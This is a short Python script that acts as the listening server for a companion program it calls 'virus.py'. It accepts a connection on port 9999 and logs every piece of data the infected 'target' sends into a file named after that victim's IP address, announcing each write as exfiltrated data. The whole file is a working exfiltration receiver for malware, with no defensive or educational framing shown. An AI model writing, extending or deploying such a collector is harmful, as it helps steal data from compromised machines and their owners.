import socket
import os

# ----------- Variables -----------
host = ''
port = 9999

# ----------- Functions ----------- 

# -- File Creation --
#region
def ip_to_filename(ip):
    return f"{ip.replace('.', '_')}.txt"

"""
function: create_target_data_file

Creates a file based off of the ip address parameter and opens it for writing.
"""
def create_target_data_file(ip):
    # Replace dots in IP address with underscores to create valid filename.
    filename = ip_to_filename(ip)

    # If there's no target file for ip, create and open the file in write mode.
    if not os.path.exists(filename):
        with open(filename, 'w') as file:
            file.write(f"IP Address: {ip}\n")

        print(f"File '{filename}' created successfully.")
#endregion

# -- Data Extraction && File Interaction
#region
"""
function: write_target_data_file

Writes to a file corresponding to the target using an ip address.
"""
def write_target_data_file(ip, data):
    # Replace dots in the IP address with underscores to create a valid filename
    filename = ip_to_filename(ip)
    
    # Open the file in append mode to add content without overwriting
    with open(filename, 'a') as file:
        file.write(str(f"{data}\n"))
    
    print(f"Data exfiltrated from '{ip}' to '{filename}'.")
#endregion

# ----------- Main Operations ----------- 

# (1) Setup connection to allow for virus.py to connect.
s = socket.socket()
s.bind((host, port))
s.listen(2)

print(host)
conn, address = s.accept()
print(f"Connected to Client: '{str(address)}'")

target_ip, target_port = address

# (2) Create a new file for each target host.
create_target_data_file(target_ip)

while True:
    # Receive the data sent from the target host.
    data = conn.recv(1024).decode()

    if not data: continue

    # (3) Send all communications to the corresponding file.
    write_target_data_file(target_ip, str(data))
    
    print(str(data).strip("'"), end='', flush=True)
conn.close()


